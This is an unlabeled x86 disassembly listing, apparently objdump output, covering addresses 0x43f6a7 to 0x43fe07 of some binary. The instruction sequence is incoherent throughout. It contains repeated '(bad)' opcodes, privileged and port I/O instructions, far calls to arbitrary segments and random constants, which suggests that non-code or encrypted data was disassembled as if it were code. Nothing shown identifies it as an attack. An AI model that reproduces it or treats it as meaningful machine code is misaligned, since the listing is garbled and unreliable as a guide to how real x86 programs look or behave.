  43f6a7:	cwde   
  43f6a8:	mov    ch,0xa0
  43f6aa:	xor    eax,0x1dbebafb
  43f6af:	les    ecx,FWORD PTR [esi+0x1e75523f]
  43f6b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f6b6:	jmp    FWORD PTR [eax+0x8]
  43f6b9:	in     eax,dx
  43f6ba:	mov    ch,0xe0
  43f6bc:	sub    DWORD PTR [ecx],ebx
  43f6be:	push   ss
  43f6bf:	mov    BYTE PTR [ebp+0x35],dl
  43f6c2:	and    eax,0x4ec75874
  43f6c7:	inc    eax
  43f6c8:	stos   BYTE PTR es:[edi],al
  43f6c9:	adc    ah,BYTE PTR [esi]
  43f6cb:	dec    eax
  43f6cc:	jge    0x43f6d4
  43f6ce:	mov    al,0xbe
  43f6d0:	pop    ebp
  43f6d1:	pop    ss
  43f6d2:	je     0x43f744
  43f6d4:	retf   
  43f6d5:	and    ecx,DWORD PTR [ebx]
  43f6d7:	push   0x1b091a2f
  43f6dc:	fadd   QWORD PTR [esp+ebx*2]
  43f6df:	loop   0x43f721
  43f6e1:	push   esi
  43f6e2:	ret    
  43f6e3:	xchg   ecx,eax
  43f6e4:	xor    dl,al
  43f6e6:	add    BYTE PTR [edx],cl
  43f6e8:	arpl   WORD PTR [edx+0x5e6ab268],ax
  43f6ee:	adc    eax,0x6071b2a0
  43f6f3:	cdq    
  43f6f4:	das    
  43f6f5:	push   edx
  43f6f6:	dec    eax
  43f6f7:	ds js  0x43f773
  43f6fa:	add    BYTE PTR [ebp-0x5b5e3c77],al
  43f700:	push   esi
  43f701:	and    bh,BYTE PTR [ebx]
  43f703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f704:	aas    
  43f705:	add    al,0x9a
  43f707:	and    BYTE PTR [eax-0x7e],bl
  43f70a:	push   0x5b6e0c43
  43f70f:	inc    eax
  43f710:	enter  0x78a6,0x1
  43f714:	mov    ds:0x6ca13ac,eax
  43f719:	pusha  
  43f71a:	jl     0x43f6f2
  43f71c:	mov    cl,0xf1
  43f71e:	mov    dl,ah
  43f720:	hlt    
  43f721:	mov    BYTE PTR [eax],ch
  43f723:	ss dec ebx
  43f725:	cmp    BYTE PTR ds:0xb4eb41fb,ah
  43f72b:	push   ecx
  43f72c:	sbb    BYTE PTR [eax],cl
  43f72e:	xor    eax,DWORD PTR [ebx*2-0x23c55fa9]
  43f735:	not    DWORD PTR [esi+0x4d1ce0f8]
  43f73b:	add    BYTE PTR [edi+0x4a6e5281],bh
  43f741:	scas   eax,DWORD PTR es:[edi]
  43f742:	or     DWORD PTR [eax+ebp*1-0x10],esp
  43f746:	cwde   
  43f747:	mov    al,ds:0x12b8808c
  43f74c:	aam    0x16
  43f74e:	stos   BYTE PTR es:[edi],al
  43f74f:	adc    eax,0xf4f1e80c
  43f754:	stos   BYTE PTR es:[edi],al
  43f755:	add    BYTE PTR [ebx+0x33],bl
  43f758:	(bad)  [edx+ecx*1-0x3c]
  43f75c:	mov    esi,0x374014c6
  43f761:	lods   al,BYTE PTR ds:[esi]
  43f762:	das    
  43f763:	fimul  DWORD PTR [edx+0x62]
  43f766:	xor    eax,DWORD PTR [ecx-0x493e0f4b]
  43f76c:	cmp    bh,BYTE PTR [esi]
  43f76e:	mov    al,0xc3
  43f770:	add    ebp,DWORD PTR [ebx+0x23]
  43f773:	fs inc ecx
  43f775:	adc    al,0x16
  43f777:	fs inc ebp
  43f779:	sub    BYTE PTR [ebp+0x1a22d247],0x76
  43f780:	jb     0x43f7fc
  43f782:	mov    edx,0xc2c286cb
  43f787:	xchg   ecx,eax
  43f788:	pop    eax
  43f789:	mov    dh,0xf6
  43f78b:	bndstx [ebx-0x20ad31f5],bnd3
  43f792:	aaa    
  43f793:	jb     0x43f745
  43f795:	loopne 0x43f769
  43f797:	ret    0x97e4
  43f79a:	dec    esp
  43f79b:	mov    dl,0x78
  43f79d:	sub    DWORD PTR [esi+ecx*4-0x715942f8],0xffffffff
  43f7a5:	xor    eax,edx
  43f7a7:	xor    BYTE PTR [edx+0x6c0c41cd],0x0
  43f7ae:	jbe    0x43f7f4
  43f7b0:	push   ds
  43f7b1:	les    eax,FWORD PTR [edx+eax*1+0x5b]
  43f7b5:	inc    ebx
  43f7b6:	lahf   
  43f7b7:	imul   ebp,DWORD PTR [edi],0x0
  43f7ba:	pop    esp
  43f7bb:	retf   0x207a
  43f7be:	clc    
  43f7bf:	jecxz  0x43f751
  43f7c1:	popa   
  43f7c2:	pop    edi
  43f7c3:	xor    dl,BYTE PTR [esi]
  43f7c5:	mov    eax,0x4602c080
  43f7ca:	sub    BYTE PTR [ebx+0x40acda0a],ah
  43f7d0:	or     al,0xa2
  43f7d2:	mov    esi,0x2ffc8aa6
  43f7d7:	inc    esp
  43f7d8:	xor    al,0xc5
  43f7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f7db:	adc    ch,dh
  43f7dd:	mov    ch,0x94
  43f7df:	add    al,BYTE PTR [edi]
  43f7e1:	pop    edi
  43f7e2:	ss push ds
  43f7e4:	or     DWORD PTR [esi-0x1e],edi
  43f7e7:	cmp    DWORD PTR [esi],esp
  43f7e9:	mov    al,0xb0
  43f7eb:	push   ebp
  43f7ec:	lock adc DWORD PTR [ebx+0x46],0x41c6cc80
  43f7f4:	push   esi
  43f7f5:	test   DWORD PTR [edx+edx*8-0x25d4c54e],esp
  43f7fc:	xor    esi,ebp
  43f7fe:	xor    BYTE PTR [ecx+0x1f],ah
  43f801:	jl     0x43f83f
  43f803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f804:	loope  0x43f822
  43f806:	sbb    eax,0x5c612a3f
  43f80b:	inc    edx
  43f80c:	pusha  
  43f80d:	(bad)  
  43f80e:	sbb    bl,BYTE PTR [eax+ecx*1-0x2f21eb84]
  43f815:	mov    eax,0x2e8a5400
  43f81a:	push   esp
  43f81b:	fcomp  QWORD PTR [eax-0x1b]
  43f81e:	aam    0xa7
  43f820:	inc    ch
  43f822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f823:	mov    dl,BYTE PTR [edx]
  43f825:	cmp    eax,0x21dadb0
  43f82a:	jo     0x43f80a
  43f82c:	inc    eax
  43f82d:	jge    0x43f7cf
  43f82f:	lods   al,BYTE PTR ds:[esi]
  43f830:	cmp    ebp,esi
  43f832:	call   0x6059:0xf62d691e
  43f839:	lock inc ebp
  43f83b:	(bad)  
  43f83c:	sub    al,0x7c
  43f83e:	mov    dl,ch
  43f840:	mov    ah,0xd4
  43f842:	sbb    eax,0x56029392
  43f847:	or     DWORD PTR [eax],ecx
  43f849:	mov    al,ds:0xa48efd1e
  43f84e:	dec    edx
  43f84f:	jecxz  0x43f7e4
  43f851:	mov    ebx,?
  43f853:	mov    ds,WORD PTR [eax-0x7a24eafd]
  43f859:	inc    esi
  43f85a:	stc    
  43f85b:	mov    fs,WORD PTR [ecx+0xf]
  43f85e:	xor    al,0xc0
  43f860:	ds sar eax,1
  43f863:	or     BYTE PTR [eax+0xf],bl
  43f866:	and    BYTE PTR [edx+0x466d77db],dl
  43f86c:	shr    DWORD PTR [edx-0x11e32000],0x22
  43f873:	xor    DWORD PTR [ecx+0x2],edx
  43f876:	adc    DWORD PTR [ecx],esp
  43f878:	test   BYTE PTR [edx+ecx*2],dh
  43f87b:	mov    al,0x24
  43f87d:	push   cs
  43f87e:	adc    BYTE PTR [esi-0x28],al
  43f881:	sti    
  43f882:	jl     0x43f81e
  43f884:	(bad)  
  43f885:	les    ecx,FWORD PTR [edx]
  43f887:	imul   ecx,DWORD PTR [edi],0xffffff85
  43f88a:	loope  0x43f818
  43f88c:	jle    0x43f825
  43f88e:	mov    esi,0x1afadc4a
  43f893:	jbe    0x43f8bd
  43f895:	lods   al,BYTE PTR ds:[esi]
  43f896:	add    BYTE PTR [edx],0xae
  43f899:	mov    edx,0x1359fee9
  43f89e:	pop    eax
  43f89f:	popa   
  43f8a0:	cmp    ah,BYTE PTR [esi-0x17]
  43f8a3:	call   0x5e96:0xd76de9ff
  43f8aa:	clc    
  43f8ab:	icebp  
  43f8ac:	xchg   ebp,eax
  43f8ad:	and    bl,dh
  43f8af:	xchg   esp,eax
  43f8b0:	fwait
  43f8b1:	xchg   ecx,eax
  43f8b2:	shl    BYTE PTR [ebp-0x23],1
  43f8b5:	and    BYTE PTR [esi+0x3270cd82],0x19
  43f8bc:	pop    edi
  43f8bd:	nop
  43f8be:	ss adc eax,0xe4c4a08c
  43f8c4:	mov    BYTE PTR [esi],0x1
  43f8c7:	sub    ch,BYTE PTR [edx-0x50]
  43f8ca:	lea    esp,[edx]
  43f8cc:	and    BYTE PTR [ebx-0x2adeeebc],dh
  43f8d2:	or     bl,BYTE PTR [edx-0x334ccba6]
  43f8d8:	cmp    edx,edi
  43f8da:	cmp    eax,0x16044796
  43f8df:	xor    al,0x70
  43f8e1:	rcr    eax,cl
  43f8e3:	rcl    BYTE PTR [esi],0xae
  43f8e6:	adc    al,0xe0
  43f8e8:	mov    bl,0xd
  43f8ea:	ins    BYTE PTR es:[edi],dx
  43f8eb:	xchg   esp,eax
  43f8ec:	cmp    edx,edi
  43f8ee:	nop
  43f8ef:	push   edi
  43f8f0:	push   cs
  43f8f1:	aam    0xc3
  43f8f3:	clc    
  43f8f4:	sub    BYTE PTR [edx-0xb],cl
  43f8f7:	adc    ah,al
  43f8f9:	daa    
  43f8fa:	sub    DWORD PTR [ebp-0x65e4d776],0x3a3286b9
  43f904:	fcom   QWORD PTR [eax-0x3f]
  43f907:	icebp  
  43f908:	and    al,0x1e
  43f90a:	rcr    BYTE PTR [esi],1
  43f90c:	xor    al,0x18
  43f90e:	add    eax,0x2ec60a84
  43f913:	fadd   DWORD PTR [esp+edx*1-0x6fa1fd08]
  43f91a:	outs   dx,BYTE PTR ds:[esi]
  43f91b:	cdq    
  43f91c:	call   0xa46c4a1e
  43f921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f922:	xor    al,0xf4
  43f924:	mov    BYTE PTR [edi],0x27
  43f927:	lods   al,BYTE PTR ds:[esi]
  43f928:	pop    es
  43f929:	adc    bl,BYTE PTR [eax+0x18148e0]
  43f92f:	pop    esi
  43f930:	inc    eax
  43f931:	ss push edx
  43f933:	fsubr  QWORD PTR [edx]
  43f935:	mov    dh,0x5a
  43f937:	xor    DWORD PTR [edx],esp
  43f939:	in     eax,dx
  43f93a:	loop   0x43f9ac
  43f93c:	hlt    
  43f93d:	adc    eax,0x593d5476
  43f942:	in     al,dx
  43f943:	fldcw  WORD PTR [esi-0x1c170939]
  43f949:	ins    DWORD PTR es:[edi],dx
  43f94a:	xlat   BYTE PTR ds:[ebx]
  43f94b:	adc    eax,0xf48170d4
  43f950:	jmp    0x291e2893
  43f955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f956:	mov    dh,dl
  43f958:	jle    0x43f95a
  43f95a:	jp     0x43f925
  43f95c:	push   eax
  43f95d:	push   ss
  43f95e:	pop    ss
  43f95f:	mov    ds,eax
  43f961:	xchg   esp,eax
  43f962:	push   ds
  43f963:	jecxz  0x43f906
  43f965:	jo     0x43f92e
  43f967:	push   ecx
  43f968:	jbe    0x43f930
  43f96a:	call   0xdfcd2b57
  43f96f:	loopne 0x43f98c
  43f971:	pop    esp
  43f972:	mov    esp,0xb03bb07
  43f977:	clc    
  43f978:	sub    DWORD PTR [edx+ecx*8],ebp
  43f97b:	repz xor BYTE PTR [ebp-0xa3bed40],dl
  43f982:	je     0x43f9ea
  43f984:	push   0xffffff98
  43f986:	add    eax,DWORD PTR [esi-0x7ac3acf2]
  43f98c:	pop    esp
  43f98d:	dec    ebx
  43f98e:	add    eax,0x28a02b0
  43f993:	mov    BYTE PTR [ebx+eax*8+0x6],cl
  43f997:	push   ebx
  43f998:	outs   dx,DWORD PTR ds:[esi]
  43f999:	cs push es
  43f99b:	fadd   QWORD PTR [ebx-0x4d]
  43f99e:	add    BYTE PTR [edx+0x5c],al
  43f9a1:	push   ds
  43f9a2:	sar    dl,1
  43f9a4:	mov    al,ds:0x373174df
  43f9a9:	scas   al,BYTE PTR es:[edi]
  43f9aa:	nop
  43f9ab:	mov    dl,0x50
  43f9ad:	fs adc ch,bl
  43f9b0:	jl     0x43fa1d
  43f9b2:	add    ch,dl
  43f9b4:	cwde   
  43f9b5:	jle    0x43f9dd
  43f9b7:	retf   0x6083
  43f9ba:	cmp    esi,DWORD PTR [eax-0x344d19e0]
  43f9c0:	dec    edi
  43f9c1:	pop    edx
  43f9c2:	mov    WORD PTR [ebx+0x9],fs
  43f9c5:	or     ebx,DWORD PTR [edx-0x13]
  43f9c8:	loop   0x43f9a1
  43f9ca:	push   es
  43f9cb:	shr    BYTE PTR [esi-0x6c],cl
  43f9ce:	sbb    DWORD PTR [eax+0x17],eax
  43f9d1:	mov    eax,ds:0x5acfd4f9
  43f9d6:	push   cs
  43f9d7:	xor    al,0x7e
  43f9d9:	cld    
  43f9da:	adc    BYTE PTR [ebx+0x6c0c2767],ah
  43f9e0:	cs cwde 
  43f9e2:	xor    al,0x93
  43f9e4:	call   0x6fe0:0x48e945c
  43f9eb:	or     DWORD PTR [edx+0xe],0x4d182b64
  43f9f2:	inc    edx
  43f9f3:	inc    ebp
  43f9f4:	jb     0x43fa2c
  43f9f6:	push   eax
  43f9f7:	or     DWORD PTR [eax],edi
  43f9f9:	xor    BYTE PTR [esi+0x34],dl
  43f9fc:	enter  0x27d0,0xa1
  43fa00:	cdq    
  43fa01:	repnz sti 
  43fa03:	inc    esp
  43fa04:	push   ds
  43fa05:	pop    eax
  43fa06:	pop    dx
  43fa08:	in     eax,dx
  43fa09:	or     ah,al
  43fa0b:	fs fs (bad) 
  43fa0e:	push   cs
  43fa0f:	wbinvd 
  43fa11:	lods   al,BYTE PTR ds:[esi]
  43fa12:	push   0xc6284afa
  43fa17:	scas   al,BYTE PTR es:[edi]
  43fa18:	clc    
  43fa19:	arpl   WORD PTR [edx+0x7d],cx
  43fa1c:	adc    DWORD PTR [ebx],ecx
  43fa1e:	pusha  
  43fa1f:	mov    al,ds:0x8642b71c
  43fa24:	or     DWORD PTR [edx+ebx*4+0x68],ebx
  43fa28:	push   ss
  43fa29:	out    0xa5,al
  43fa2b:	stos   BYTE PTR es:[edi],al
  43fa2c:	test   dh,0x58
  43fa2f:	xor    BYTE PTR [esi+0x1f9c15b0],ah
  43fa35:	lods   al,BYTE PTR ds:[esi]
  43fa36:	push   cs
  43fa37:	push   es
  43fa38:	shl    BYTE PTR [edx],cl
  43fa3a:	cmc    
  43fa3b:	dec    ebx
  43fa3c:	int    0xb8
  43fa3e:	fs jg  0x43fa91
  43fa41:	outs   dx,BYTE PTR ds:[esi]
  43fa42:	mov    bl,0x20
  43fa44:	pusha  
  43fa45:	stos   DWORD PTR es:[edi],eax
  43fa46:	clc    
  43fa47:	loopne 0x43fac0
  43fa49:	pop    eax
  43fa4a:	and    dl,dh
  43fa4c:	add    dl,ah
  43fa4e:	imul   esi,DWORD PTR [esi+edx*2+0xfa40f0],0xe2ba588d
  43fa59:	xor    ch,BYTE PTR cs:[ebp-0x4a]
  43fa5d:	sbb    DWORD PTR [esi-0x29ee815a],edi
  43fa63:	xor    al,0xe7
  43fa65:	lds    edx,FWORD PTR [edx-0x10]
  43fa68:	add    BYTE PTR [ebx-0xd0cbbae],ah
  43fa6e:	xlat   BYTE PTR ds:[ebx]
  43fa6f:	push   0x4ca0a526
  43fa74:	pushf  
  43fa75:	leave  
  43fa76:	adc    al,0xda
  43fa78:	or     eax,DWORD PTR [ebx+0x5e]
  43fa7b:	mov    esi,0x5439ad1
  43fa80:	stos   BYTE PTR es:[edi],al
  43fa81:	scas   al,BYTE PTR es:[edi]
  43fa82:	dec    edi
  43fa83:	call   0x8ade:0xc2929f29
  43fa8a:	add    DWORD PTR [ebx-0x254bd7f2],edx
  43fa90:	adc    BYTE PTR [edi+0x72],bh
  43fa93:	aad    0x1c
  43fa95:	mov    eax,ds:0xb042d8ed
  43fa9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa9b:	xor    al,0x16
  43fa9d:	xor    cl,BYTE PTR [ebx]
  43fa9f:	add    cl,dh
  43faa1:	xchg   ebx,eax
  43faa2:	js     0x43fa38
  43faa4:	rcl    BYTE PTR [ebx+0x7b0f0bee],cl
  43faaa:	or     BYTE PTR [ebx-0x5],ah
  43faad:	call   0x9710:0xdd2ecaee
  43fab4:	add    eax,0xa9ab4b1c
  43fab9:	xor    eax,0xb7dceb76
  43fabe:	and    dh,dl
  43fac0:	fistp  QWORD PTR [edx+0x29]
  43fac3:	add    DWORD PTR [ebx-0xf],ebx
  43fac6:	adc    BYTE PTR [ebx-0x6b3e9b2f],0x2
  43facd:	loopne 0x43fa4f
  43facf:	test   al,0xd2
  43fad1:	(bad)
  43fad4:	fimul  DWORD PTR [ebx-0x17]
  43fad7:	mov    bl,0xa5
  43fad9:	push   ebp
  43fada:	retw   
  43fadc:	mov    ah,0xfe
  43fade:	add    al,0xf0
  43fae0:	xchg   edx,eax
  43fae1:	(bad)  
  43fae2:	call   0xa2d8a360
  43fae7:	adc    ecx,DWORD PTR [eax]
  43fae9:	jmp    0xb2df:0xcaf8478
  43faf0:	pop    eax
  43faf1:	sti    
  43faf2:	sub    eax,0x221760ab
  43faf7:	mov    edx,0xa31e2eef
  43fafc:	xor    eax,0xb035ec2b
  43fb01:	pop    ebx
  43fb02:	mov    dh,0xae
  43fb04:	stos   BYTE PTR es:[edi],al
  43fb05:	inc    esp
  43fb06:	mov    eax,0xf0c87a5e
  43fb0b:	rol    BYTE PTR [edi+0x43],1
  43fb0e:	cwde   
  43fb0f:	xor    al,0x61
  43fb11:	mov    bh,BYTE PTR [eax+0x5]
  43fb14:	sub    al,0x96
  43fb16:	and    ch,BYTE PTR [ebp-0x8c75560]
  43fb1c:	cld    
  43fb1d:	xchg   esi,eax
  43fb1e:	jle    0x43fafb
  43fb20:	cmp    al,0x6b
  43fb22:	les    edx,FWORD PTR [edx]
  43fb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fb25:	fs sub ebp,ecx
  43fb28:	daa    
  43fb29:	add    al,0x28
  43fb2b:	dec    edx
  43fb2c:	xchg   ecx,eax
  43fb2d:	push   es
  43fb2e:	push   0x5ec0981c
  43fb33:	cmp    DWORD PTR [esp+eax*2+0x6c],ebx
  43fb37:	loopne 0x43fb4a
  43fb39:	aad    0x20
  43fb3b:	xchg   DWORD PTR [esi+0x1e1af834],edi
  43fb41:	dec    ebx
  43fb42:	js     0x43fbaa
  43fb44:	inc    eax
  43fb45:	or     al,0x4c
  43fb47:	sub    eax,0x6859c2a7
  43fb4c:	or     eax,0x6822b697
  43fb51:	add    bl,BYTE PTR [edi+0x16]
  43fb54:	xor    bl,dl
  43fb56:	imul   BYTE PTR [ecx+0x2c]
  43fb59:	jb     0x43fae3
  43fb5b:	add    eax,0x830a8318
  43fb60:	in     al,0x2e
  43fb62:	sahf   
  43fb63:	mov    DWORD PTR [edx],edx
  43fb65:	mov    ebp,0x27f52aa6
  43fb6a:	sbb    bl,BYTE PTR [ebx]
  43fb6c:	fwait
  43fb6d:	xor    eax,0x26309634
  43fb72:	(bad)  
  43fb73:	jbe    0x43fb85
  43fb75:	and    ax,0x863c
  43fb79:	pusha  
  43fb7a:	pop    edx
  43fb7b:	js     0x43fbe3
  43fb7d:	ds neg eax
  43fb80:	shl    BYTE PTR [edx],1
  43fb82:	loopne 0x43fba9
  43fb84:	and    al,0x0
  43fb86:	xor    eax,0x7c553434
  43fb8b:	outs   dx,BYTE PTR ds:[esi]
  43fb8c:	or     bh,BYTE PTR [edx]
  43fb8e:	jp     0x43fb30
  43fb90:	sahf   
  43fb91:	ret    0xbf19
  43fb94:	add    al,0x1c
  43fb96:	inc    bh
  43fb98:	jo     0x43fbee
  43fb9a:	adc    BYTE PTR ds:0x4a63a538,dh
  43fba0:	(bad)  
  43fba1:	jl     0x43fb9b
  43fba3:	add    bl,BYTE PTR [ebx-0x69]
  43fba6:	xchg   BYTE PTR [esi],dh
  43fba8:	cli    
  43fba9:	sub    bh,dl
  43fbab:	push   edx
  43fbac:	or     eax,eax
  43fbae:	inc    ebx
  43fbaf:	or     ebx,DWORD PTR [ebx-0x3485b382]
  43fbb5:	ins    BYTE PTR es:[edi],dx
  43fbb6:	test   eax,0xf1107ced
  43fbbb:	mov    DWORD PTR [ebp+edi*8-0x2],esi
  43fbbf:	es or  eax,0xfa9ae3db
  43fbc5:	sub    edx,ebx
  43fbc7:	fidivr WORD PTR [esp+ecx*8+0x6a4872ee]
  43fbce:	xor    BYTE PTR [edx],dl
  43fbd0:	sbb    bh,BYTE PTR [ebp+0x19e927e]
  43fbd6:	sub    al,0x56
  43fbd8:	and    eax,0x112cbc9c
  43fbdd:	lea    eax,[esp+ebx*2]
  43fbe0:	enter  0xa628,0x7
  43fbe4:	test   ebx,edx
  43fbe6:	pmulhuw mm5,mm0
  43fbe9:	jae    0x43fc07
  43fbeb:	inc    edx
  43fbec:	inc    edx
  43fbed:	clc    
  43fbee:	sub    bl,ah
  43fbf0:	dec    ebx
  43fbf1:	jecxz  0x43fbc7
  43fbf3:	jg     0x43fc68
  43fbf5:	inc    ebp
  43fbf6:	cmp    al,0x16
  43fbf8:	push   ds
  43fbf9:	div    al
  43fbfb:	mov    DWORD PTR [ebp+ebx*1+0xcd6c6c3],ebp
  43fc02:	(bad)  
  43fc03:	lock and BYTE PTR [eax+edi*8],ah
  43fc07:	xor    al,0x2e
  43fc09:	pop    esi
  43fc0a:	jmp    0xf6611726
  43fc0f:	xchg   ecx,eax
  43fc10:	push   0x11
  43fc12:	sbb    eax,0x624d4e70
  43fc17:	xchg   ecx,eax
  43fc18:	cwde   
  43fc19:	push   eax
  43fc1a:	jb     0x43fc00
  43fc1c:	cwde   
  43fc1d:	int    0xd5
  43fc1f:	adc    BYTE PTR [edx+0x51],0x87
  43fc23:	mov    dl,0x2a
  43fc25:	das    
  43fc26:	outs   dx,BYTE PTR ds:[esi]
  43fc27:	adc    BYTE PTR [ebx+0x61],al
  43fc2a:	inc    edi
  43fc2b:	sbb    DWORD PTR [edx],0xffffffec
  43fc2e:	shl    BYTE PTR [eax+0x2],1
  43fc31:	das    
  43fc32:	bound  esi,QWORD PTR [eax+0x780b92cd]
  43fc38:	push   cs
  43fc39:	add    esp,DWORD PTR [esp+esi*8-0x525e947e]
  43fc40:	mov    dl,0xa7
  43fc42:	jnp    0x43fcc0
  43fc44:	mov    bh,0x98
  43fc46:	xchg   ebx,eax
  43fc47:	mov    ds:0xf9aa08f8,al
  43fc4c:	sti    
  43fc4d:	dec    edx
  43fc4e:	add    BYTE PTR [ecx-0x1e098fb5],bl
  43fc54:	(bad)  
  43fc55:	pop    ss
  43fc56:	sbb    BYTE PTR [esi+0x13],0x4a
  43fc5a:	inc    BYTE PTR [ecx]
  43fc5c:	fdiv   st,st(4)
  43fc5e:	push   0x1445a2a6
  43fc63:	sub    al,0x82
  43fc65:	repnz shr BYTE PTR [edx+0x4],1
  43fc69:	rcl    al,1
  43fc6b:	pusha  
  43fc6c:	enter  0x626c,0x5f
  43fc70:	xchg   ecx,eax
  43fc71:	inc    esi
  43fc72:	sub    eax,DWORD PTR [ecx+0x38c1ad05]
  43fc78:	stos   BYTE PTR es:[edi],al
  43fc79:	retf   
  43fc7a:	cli    
  43fc7b:	outs   dx,DWORD PTR ds:[esi]
  43fc7c:	mov    ah,0x87
  43fc7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fc7f:	(bad)  
  43fc80:	inc    edi
  43fc81:	loopne 0x43fc08
  43fc83:	mov    ss,WORD PTR [eax-0x1c]
  43fc86:	add    ch,BYTE PTR ds:0xc0f6b57
  43fc8c:	cmp    al,0xde
  43fc8e:	rcr    DWORD PTR [edx-0x2e],cl
  43fc91:	or     dl,ch
  43fc93:	mov    ds,WORD PTR [ebp+0x425e8664]
  43fc99:	inc    eax
  43fc9a:	or     eax,0x84609f92
  43fc9f:	pop    ebp
  43fca0:	add    eax,0x60ea7a1f
  43fca5:	scas   eax,DWORD PTR es:[edi]
  43fca6:	add    ah,BYTE PTR [edx+0x54]
  43fca9:	inc    esp
  43fcaa:	mov    ebx,0x82ac33a1
  43fcaf:	stos   DWORD PTR es:[edi],eax
  43fcb0:	out    dx,al
  43fcb1:	fisubr DWORD PTR [ebx-0x3f4f63f0]
  43fcb7:	in     al,dx
  43fcb8:	dec    ecx
  43fcb9:	cmp    al,BYTE PTR [ebp-0x1ebbfd0c]
  43fcbf:	clc    
  43fcc0:	mov    ah,0xc1
  43fcc2:	or     cl,ch
  43fcc4:	fimul  DWORD PTR [esi-0x2115003d]
  43fcca:	lea    edi,[edi]
  43fccc:	and    al,BYTE PTR ds:0x61305240
  43fcd2:	je     0x43fcac
  43fcd4:	push   0xac03346
  43fcd9:	pop    es
  43fcda:	pop    eax
  43fcdb:	or     ecx,DWORD PTR [esi+0x3b4e891e]
  43fce1:	enter  0x250a,0xb4
  43fce5:	lods   eax,DWORD PTR ds:[esi]
  43fce6:	mov    ch,0xb5
  43fce8:	mov    cs,WORD PTR [ebp-0xc]
  43fceb:	cdq    
  43fcec:	mov    al,ds:0x229482b6
  43fcf1:	callw  0x3b77
  43fcf5:	mov    dh,0x4f
  43fcf7:	jle    0x43fd6b
  43fcf9:	cmp    al,ch
  43fcfb:	ins    DWORD PTR es:[edi],dx
  43fcfc:	jecxz  0x43fc88
  43fcfe:	aam    0x95
  43fd00:	and    BYTE PTR [esi-0x59c7547f],0xd1
  43fd07:	sar    BYTE PTR [edi],cl
  43fd09:	mov    fs,WORD PTR [ecx+0x1c]
  43fd0c:	pop    esi
  43fd0d:	mov    gs,WORD PTR [ecx+0x595b030f]
  43fd13:	jbe    0x43fd2c
  43fd15:	out    0x72,al
  43fd17:	push   eax
  43fd18:	and    al,0x80
  43fd1a:	lods   eax,DWORD PTR ds:[esi]
  43fd1b:	sub    DWORD PTR [esi+0x38be6ba6],esp
  43fd21:	loop   0x43fd3d
  43fd23:	jne    0x43fcd1
  43fd25:	clc    
  43fd26:	dec    eax
  43fd27:	xchg   ebx,eax
  43fd28:	cmp    BYTE PTR [esi-0x4f],0xe4
  43fd2c:	sub    ch,BYTE PTR ds:0x5014408
  43fd32:	or     eax,DWORD PTR [esi]
  43fd34:	popf   
  43fd35:	and    BYTE PTR [edx+0x6f],bl
  43fd38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43fd39:	add    BYTE PTR [ecx],0xfb
  43fd3c:	inc    esp
  43fd3d:	sar    edi,0x2e
  43fd40:	mov    WORD PTR [esi],ds
  43fd42:	adc    BYTE PTR [edx+0x11],al
  43fd45:	mov    esi,0xf849d00b
  43fd4a:	rcl    BYTE PTR [esp+edi*1+0x12],1
  43fd4e:	sbb    ch,ch
  43fd50:	mov    ah,0xfa
  43fd52:	or     eax,0xde6a2b94
  43fd57:	adc    bh,BYTE PTR [ecx]
  43fd59:	or     ch,BYTE PTR [edx-0x62]
  43fd5c:	mov    edi,0x6a52ed3a
  43fd61:	pop    ebx
  43fd62:	dec    ebp
  43fd63:	fdiv   QWORD PTR [ebx]
  43fd65:	icebp  
  43fd66:	cli    
  43fd67:	jp     0x43fd01
  43fd69:	nop
  43fd6a:	and    bh,BYTE PTR [edx-0x7b893ab0]
  43fd70:	scas   al,BYTE PTR es:[edi]
  43fd71:	sbb    BYTE PTR [ebx+0x70210cee],bh
  43fd77:	dec    esp
  43fd78:	dec    edi
  43fd79:	push   ss
  43fd7a:	lock sbb esi,0xffffffd8
  43fd7e:	pop    es
  43fd7f:	mov    esi,0x83c05a27
  43fd84:	mov    al,ds:0x53abd224
  43fd89:	push   0xdabb3810
  43fd8e:	push   eax
  43fd8f:	push   ds
  43fd90:	jne    0x43fdc7
  43fd92:	xor    eax,0xce0a5a7c
  43fd97:	data16 loop 0x43fd9c
  43fd9a:	or     BYTE PTR [edi],bl
  43fd9c:	mov    WORD PTR [edx+0x20],?
  43fd9f:	mov    al,0x58
  43fda1:	out    dx,al
  43fda2:	or     DWORD PTR [edx],edx
  43fda4:	stos   DWORD PTR es:[edi],eax
  43fda5:	fidivr WORD PTR [eax-0x55c914f7]
  43fdab:	adc    BYTE PTR [edx+0x568022d8],bl
  43fdb1:	inc    esp
  43fdb2:	cmp    ch,cl
  43fdb4:	mov    esi,0x2c202738
  43fdb9:	cmp    bh,BYTE PTR [esi-0x3e79c729]
  43fdbf:	mov    eax,0xea4fa185
  43fdc4:	inc    ebx
  43fdc5:	pop    esi
  43fdc6:	add    cl,cl
  43fdc8:	jmp    0x9a6c:0x40007e06
  43fdcf:	out    0xbc,al
  43fdd1:	jne    0x43fe1e
  43fdd3:	test   BYTE PTR [ebx],0xba
  43fdd6:	fist   WORD PTR [edx-0x12]
  43fdd9:	cmp    al,0x9d
  43fddb:	push   esi
  43fddc:	xor    eax,0x1fda4dfb
  43fde1:	mov    ebx,0x127d8288
  43fde6:	test   DWORD PTR [eax+0xf8a43],esi
  43fdec:	(bad)  
  43fded:	xchg   edx,eax
  43fdee:	js     0x43fdd8
  43fdf0:	fdiv   DWORD PTR [eax+0x742866b2]
  43fdf6:	push   ss
  43fdf7:	sub    dh,BYTE PTR [ecx+edx*4-0x17]
  43fdfb:	mov    BYTE PTR [esi],dh
  43fdfd:	pop    ebp
  43fdfe:	cdq    
  43fdff:	(bad)  
  43fe00:	xlat   BYTE PTR ds:[ebx]
  43fe01:	mov    dl,0xa8
  43fe03:	mov    dl,0x50
  43fe05:	mov    eax,DWORD PTR [edx]
  43fe07:	stos   BYTE PTR es:[edi],al
